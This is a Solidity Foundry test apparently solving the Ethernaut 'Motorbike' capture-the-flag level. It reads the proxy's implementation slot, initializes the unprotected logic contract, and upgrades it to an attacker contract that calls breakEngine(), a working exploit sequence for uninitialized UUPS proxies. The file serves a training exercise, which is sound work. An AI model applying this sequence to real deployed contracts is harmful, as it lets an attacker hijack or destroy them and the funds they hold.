// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/vm.sol";
import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Motorbike/MotorbikeFactory.sol";
import "../src/levels/Motorbike/MotorbikeAttacker.sol";

contract MotorbikeTest is DSTest {
    Ethernaut ethernaut;
    MotorbikeFactory motorbikeFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        motorbikeFactory = new MotorbikeFactory();
        ethernaut.registerLevel(motorbikeFactory);
    }

    function testIsMotorbikeCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance(motorbikeFactory);

        bytes32 _IMPLEMENTATION_SLOT = vm.load(
            instance,
            bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
        );
        address engine_ = address(uint160(uint256(_IMPLEMENTATION_SLOT)));

        Engine engine = Engine(engine_);
        engine.initialize();

        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();

        engine.upgradeToAndCall(
            address(motorbikeAttacker),
            abi.encodeWithSignature("breakEngine()")
        );

        vm.stopPrank();
    }
}
